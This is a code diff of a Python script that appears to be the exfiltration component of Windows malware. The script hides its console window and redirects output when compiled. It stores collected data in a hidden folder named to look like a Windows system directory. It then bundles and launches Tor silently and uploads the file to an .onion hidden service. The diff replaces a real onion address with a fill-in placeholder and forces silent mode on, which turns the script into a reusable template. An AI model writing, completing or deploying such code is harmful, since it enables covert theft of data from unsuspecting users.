@@ -8,9 +8,8 @@ import ctypes
 import shutil
 
 # --- SILENT MODE DETECTION ---
-# Detect if running as PyInstaller executable
 IS_EXE = getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS')
-SILENT_MODE = IS_EXE  # Run silently when compiled as .exe
+SILENT_MODE = True
 
 # Hide console window when running as .exe
 if IS_EXE:
@@ -28,37 +27,31 @@ if IS_EXE:
     # Redirect stdout/stderr to null when silent
     if SILENT_MODE:
         try:
-            #  devnull is a file that does not exist
             sys.stdout = open(os.devnull, 'w')
             sys.stderr = open(os.devnull, 'w')
         except:
             pass
 
 # --- PATH DEFINITIONS ---
-# Define the target directory and file path
 DIR = os.path.join(os.getenv('APPDATA', os.path.expanduser('~')), 'Microsoft', 'Windows', 'System32')
 FILE_TO_SEND = os.path.join(DIR, 'SystemLog.dat')
-# ------------------------
 
-ONION = "tsqopt6xu4kxdqfjokx2a2pnwp3jvl5ff5xhgpwcjvnjkli4rymvz5id.onion"
+ONION = "CHANGE_TO_YOUR_ONION_ADDRESS.onion"
 
 # Path to Tor executable on Windows
 TOR_PATH = r"C:\Program Files\Tor\tor.exe"
 TOR_INSTALL_DIR = r"C:\Program Files\Tor"
 
 # Bundled Tor Expert Bundle location (relative to script directory)
-# Handle PyInstaller paths correctly
 if IS_EXE:
     # When running as .exe, use the directory containing the .exe
     SCRIPT_DIR = os.path.dirname(os.path.abspath(sys.executable))
-    # MEIPASS is a temp directory used by PyInstaller to store bundled files
     MEIPASS = getattr(sys, '_MEIPASS', None)
     if MEIPASS and os.path.exists(os.path.join(MEIPASS, 'tor')):
         TOR_BUNDLE_DIR = os.path.join(MEIPASS, 'tor')
     else:
         TOR_BUNDLE_DIR = os.path.join(SCRIPT_DIR, 'tor')
 else:
-    # When running as script, use __file__
     SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
     TOR_BUNDLE_DIR = os.path.join(SCRIPT_DIR, 'tor')
 
@@ -132,9 +125,7 @@ def check_tor_installed():
     return False
 
 def find_bundled_tor():
-    # Find the bundled Tor Expert Bundle root directory.
-    # Returns the path to the bundle root directory (e.g., tor-expert-bundle-windows-x86_64-15),
-    # or None if not found.
+    """Find the bundled Tor Expert Bundle root directory."""
 
     # Try multiple possible locations
     search_paths = [TOR_BUNDLE_DIR]
@@ -397,11 +388,6 @@ def install_tor():
             error_log = os.path.join(os.path.expanduser('~'), 'tor_install_error.log')
             with open(error_log, 'w') as f:
                 f.write(f"Error: {e}\n")
-                # traceback is used for debugging it is a module that is used to print the stack trace of the error
-                import traceback
-                f.write(traceback.format_exc())
-        except:
-            pass
         if not SILENT_MODE:
             import traceback
             traceback.print_exc()
@@ -420,8 +406,6 @@ def create_directories_and_files():
         
         # Make directory hidden
         try:
-            # FILE_ATTRIBUTE_HIDDEN is a constant that is used to mark a file as hidden
-            # ctypes is used to call the SetFileAttributesW function in the Windows API
             ctypes.windll.kernel32.SetFileAttributesW(DIR, 0x02)  # FILE_ATTRIBUTE_HIDDEN
             silent_print("Directory marked as hidden")
         except Exception as e:
@@ -552,7 +536,7 @@ def write_temp_torrc(tempdir):
     """Creates a temporary torrc file for connecting to the public hidden service."""
     torrc = os.path.join(tempdir, "torrc")
     with open(torrc, "w") as f:
-        f.write("SOCKSPort 9050\n") # Tor opens the SOCKS proxy gateway
+        f.write("SOCKSPort 9050\n")
     return torrc
 
 def start_tor(torrc, silent=True):
@@ -566,7 +550,7 @@ def start_tor(torrc, silent=True):
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL,
                                creationflags=creation_flags)
-        time.sleep(7) # Wait for Tor to bootstrap (ideally, check logs/control port)
+        time.sleep(7)
         return proc
     except Exception:
         return None
@@ -592,7 +576,6 @@ def send_data(filepath, silent=True):
 
     proxies = {
         # socks5h ensures DNS resolution happens within the Tor network
-        # DNS resolution is the process of converting a domain name to an IP address
         "http": "socks5h://127.0.0.1:9050",
         "https": "socks5h://127.0.0.1:9050"
     }
@@ -654,7 +637,7 @@ def start_sender(log_file_path=None):
                 return
 
             # Give Tor an extra moment to bootstrap after the initial sleep
-            # bootstrap is the process of connecting to the Tor network
+            # Give Tor an extra moment to bootstrap after the initial sleep
             time.sleep(1)
             
             # Send log file if it exists and has content
@@ -683,7 +666,6 @@ def start_sender(log_file_path=None):
 
 if __name__ == "__main__":
     # Check if setup flag is provided or if this is first run
-    # sys is used for system specific parameters and functions
     setup_flag = '--setup' in sys.argv or '--install' in sys.argv
     
     # Try to load existing config
